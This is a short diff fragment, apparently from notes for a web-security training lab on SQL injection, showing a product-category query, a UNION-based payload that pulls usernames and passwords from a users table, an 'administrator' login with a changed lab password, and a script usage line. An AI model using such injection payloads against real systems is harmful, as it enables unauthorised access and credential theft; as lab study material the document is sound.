@@ -24,6 +24,6 @@ select a, b from products where category='Gifts
 ' UNION select username, password from users--
 
 administrator
-tqx26ugf8jp1g30atsu9
+we6kde39ff7bgm4s3ji9
 
 script.py <url> 
